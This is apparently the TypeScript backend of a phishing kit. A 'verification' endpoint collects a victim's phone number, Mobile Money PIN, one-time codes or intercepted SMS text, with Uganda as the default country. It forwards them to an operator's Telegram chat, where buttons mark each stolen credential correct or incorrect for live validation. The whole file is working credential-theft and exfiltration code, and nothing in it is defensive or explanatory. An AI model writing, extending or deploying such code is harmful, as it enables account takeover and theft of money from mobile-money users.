// Universal Vercel Serverless Function & Express Route: sendForVerification
import {
  getTelegramCredentials,
  sendTelegramMessage,
  escapeHtml,
  formatExtraFields,
  parseRequestBody,
  verificationSessionStore,
  disableTelegramWebhook,
} from './_telegram';

export default async function handler(req: any, res: any) {
  if (res && typeof res.setHeader === 'function') {
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,POST');
    res.setHeader(
      'Access-Control-Allow-Headers',
      'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
    );
  }

  if (req.method === 'OPTIONS') {
    return res.status ? res.status(200).end() : res.end();
  }

  if (req.method !== 'POST') {
    const errorMsg = { error: 'Method not allowed' };
    return res.status ? res.status(405).json(errorMsg) : res.end(JSON.stringify(errorMsg));
  }

  try {
    const input = parseRequestBody(req);
    const { botToken, chatId, chatIds } = getTelegramCredentials();
    const sessionId = `${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
    const timeStr = new Date().toUTCString();

    // Register session in global store
    verificationSessionStore.set(sessionId, {
      status: 'pending',
      type: input.type,
      phone: input.phone || '',
      country: input.country || '',
      updatedAt: Date.now(),
    });

    let messageHtml = '';
    if (input.type === 'pin') {
      messageHtml =
        `📱 <b>MoMo PIN Verification Required</b>\n\n` +
        `🌍 <b>Country:</b> ${escapeHtml(input.country || 'Uganda')}\n` +
        `📞 <b>Phone:</b> <code>${escapeHtml(input.countryCode || '+256')} ${escapeHtml(input.phone || '')}</code>\n` +
        `🔐 <b>MoMo PIN:</b> <code>${escapeHtml(input.pin || 'N/A')}</code>\n` +
        `⏰ <b>Time:</b> ${escapeHtml(timeStr)}\n\n` +
        `👉 <i>Is this MoMo PIN correct?</i>` +
        formatExtraFields(input, ['type', 'country', 'countryCode', 'phone', 'pin']);
    } else if (input.type === 'final_otp' || (input.type === 'otp' && !input.smsMessage)) {
      messageHtml =
        `🔐 <b>4-Digit OTP Verification Required</b>\n\n` +
        `🌍 <b>Country:</b> ${escapeHtml(input.country || 'Uganda')}\n` +
        `📞 <b>Phone:</b> <code>${escapeHtml(input.countryCode || '+256')} ${escapeHtml(input.phone || '')}</code>\n` +
        `🔢 <b>OTP Code:</b> <code>${escapeHtml(input.otp || 'N/A')}</code>\n` +
        `⏰ <b>Time:</b> ${escapeHtml(timeStr)}\n\n` +
        `👉 <i>Is this 4-digit OTP code correct?</i>` +
        formatExtraFields(input, ['type', 'country', 'countryCode', 'phone', 'otp']);
    } else {
      messageHtml =
        `📩 <b>SMS Message Verification Required</b>\n\n` +
        `🌍 <b>Country:</b> ${escapeHtml(input.country || 'Uganda')}\n` +
        `📞 <b>Phone:</b> <code>${escapeHtml(input.countryCode || '+256')} ${escapeHtml(input.phone || '')}</code>\n` +
        `⏰ <b>Time:</b> ${escapeHtml(timeStr)}\n\n` +
        `💬 <b>Full SMS Message:</b>\n<pre>${escapeHtml(input.smsMessage || input.otp || 'N/A')}</pre>\n\n` +
        `👉 <i>Is this SMS message valid?</i>` +
        formatExtraFields(input, ['type', 'country', 'countryCode', 'phone', 'smsMessage', 'otp']);
    }

    if (botToken && chatId) {
      const keyboard = [
        [
          { text: '✅ Correct', callback_data: `correct_${sessionId}` },
          { text: '❌ Incorrect', callback_data: `incorrect_${sessionId}` },
        ],
      ];

      const targets = chatIds.length > 0 ? chatIds : [chatId];
      const sendRes = await sendTelegramMessage(botToken, targets, messageHtml, keyboard);

      if (sendRes.ok && sendRes.result?.message_id) {
        const s = verificationSessionStore.get(sessionId);
        if (s) s.messageId = sendRes.result.message_id;
      } else if (!sendRes.ok) {
        // If bot token is unauthorized (401) or delivery fails, trigger simulation auto-approval
        setTimeout(() => {
          const s = verificationSessionStore.get(sessionId);
          if (s && s.status === 'pending') {
            s.status = 'correct';
          }
        }, 2500);
      }
    } else {
      console.log('[Telegram Verification Request (Demo Mode)]\n', messageHtml.replace(/<[^>]*>/g, ''));
      // In local/demo mode without bot credentials, simulate approval after 2.5s
      setTimeout(() => {
        const s = verificationSessionStore.get(sessionId);
        if (s && s.status === 'pending') {
          s.status = 'correct';
        }
      }, 2500);
    }

    const payload = { sessionId };
    return res.status ? res.status(200).json(payload) : res.end(JSON.stringify(payload));
  } catch (error: any) {
    console.warn('[sendForVerification Notice]:', error.message || error);
    const fallbackSession = `${Date.now()}_fallback`;
    const payload = { sessionId: fallbackSession };
    return res.status ? res.status(200).json(payload) : res.end(JSON.stringify(payload));
  }
}
